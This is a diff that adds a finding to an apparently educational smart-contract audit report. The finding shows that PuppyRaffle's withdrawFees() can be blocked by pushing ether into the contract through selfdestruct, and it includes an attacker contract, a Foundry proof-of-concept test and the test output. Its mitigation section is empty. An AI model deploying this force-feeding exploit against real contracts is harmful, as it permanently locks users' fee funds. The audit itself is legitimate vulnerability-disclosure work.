@@ -48,6 +48,7 @@ Lead Auditors:
     - [\[S-#\] The randomness generator in the `PuppyRaffle::selectWinner()` is not really random and can be influenced which breaks one of the main functioalities of the protocol "4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy"](#s--the-randomness-generator-in-the-puppyraffleselectwinner-is-not-really-random-and-can-be-influenced-which-breaks-one-of-the-main-functioalities-of-the-protocol-4-every-x-seconds-the-raffle-will-be-able-to-draw-a-winner-and-be-minted-a-random-puppy)
     - [\[S-#\] `PuppyRaffle::fee` is uint64 and can be overflown breaking the arithmetics of the protocol](#s--puppyrafflefee-is-uint64-and-can-be-overflown-breaking-the-arithmetics-of-the-protocol)
     - [\[S-#\] Unsafe casting of uint256 to uint64 would lead to loss of fee funds, if `fee` is higher than `type(uint64).max`, which is approximately 18.45 ether.](#s--unsafe-casting-of-uint256-to-uint64-would-lead-to-loss-of-fee-funds-if-fee-is-higher-than-typeuint64max-which-is-approximately-1845-ether)
+    - [\[S-#\] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.](#s--the-puppyrafflewithdrawfees-function-is-sucseptible-to-self-destruct-attacks-which-would-lead-to-fees-being-stuck-in-the-contact)
 - [Medium](#medium)
 - [Low](#low)
 - [Informational](#informational)
@@ -508,6 +509,104 @@ Output:
 ++          totalFees = totalFees + fee;
             uint256 tokenId = totalSupply();
 ```
+
+
+
+### [S-#] The `PuppyRaffle::withdrawFees()` function is sucseptible to self-destruct attacks, which would lead to fees being stuck in the contact.
+
+**Description:** The `PuppyRaffle::withdrawFees()` function does the require check as the first step:
+
+```solidity
+    function withdrawFees() external {
+@-->    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!"); 
+```
+
+Although it is a good way to assert that no prize funds are left in the contact, there is an issue. Contracts can receive funds by 3 means: 
+1. through `receive()`function - not an issue, as there is no `receive()` function
+2. through `fallback()`function - not an issue, as there is no `fallback()` function
+3. when another contract self-destructs - issue.
+
+**Impact:** If the require statement fails, the `PuppyRaffle::withdrawFees()` function could never be called, leading to breaking the functionality of the contract and losing all the future fees.
+
+**Proof of Concept:** Anyon could forcefully push funds to the contract through self-destruct by creating a contract and calling the destroy method on it. The following test shows the way of accomplishing this.
+
+1. Create an attacker contract 
+```solidity
+    contract selfDestruct {
+        
+        PuppyRaffle puppyRaffle;
+        constructor(PuppyRaffle _puppyRaffle) {
+            puppyRaffle = _puppyRaffle;
+        }
+
+        function destroy() public {
+            selfdestruct(payable(address(puppyRaffle)));
+        }
+    }
+```
+
+2. Create a test:
+```solidity
+    modifier playersEntered() {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+        _;
+    }
+
+    function testCanBreakWithdrawFees() public playersEntered {
+// DONE - 1. enterRaffle with entranceFee with the help of modifier playersEntered
+
+// DONE - 2. console.log(address(this).balance) before pushing through self-destruct
+        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract before attack");
+
+// DONE - 3. Create an attackerContract instance and load with funds
+        selfDestruct attackerContract = new selfDestruct(puppyRaffle);
+        vm.deal(address(attackerContract), 10 ether);
+        console.log(address(attackerContract).balance, "= Balance of Attacker contract");
+        
+// DONE - 4. Push funds through self-destruct to the address(PuppyRaffle)
+        vm.prank(playerOne);
+        attackerContract.destroy();
+
+// 5. Test selectWinner(), so that totalFees != 0
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+
+// DONE - 5. console.log(address(this).balance)
+        console.log(address(puppyRaffle).balance, "= Balance of PuppyRaffle contract after attack");
+        console.log(puppyRaffle.totalFees(), "= PuppyRaffle totalFees currently");
+        
+// DONE - 6. create a check for the next call to revert  
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        vm.prank(playerOne);
+
+// DONE - 7. call puppyRaffle.withdrawFees()
+        puppyRaffle.withdrawFees();
+    }
+}
+```
+
+3. Check the output:
+```bash
+    Ran 1 test for test/Audit_PoC_Selfdestruct.t.sol:Audit_PoC_Selfdestruct
+    [PASS] testCanBreakWithdrawFees() (gas: 360042)
+    Logs:
+    4000000000000000000 = Balance of PuppyRaffle contract before attack
+    10000000000000000000 = Balance of Attacker contract
+@-->10800000000000000000 = Balance of PuppyRaffle contract after attack
+@-->800000000000000000 = PuppyRaffle totalFees currently
+
+    Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.80ms (1.23ms CPU time)
+```
+
+As you see the `address(this).balance` is not equal to the `PuppyRaffle::totalFees()`, thus the `PuppyRidge::withdrawFees()` function would revert during the first require check.
+
+**Recommended Mitigation:** 
 # Medium
 # Low 
 # Informational
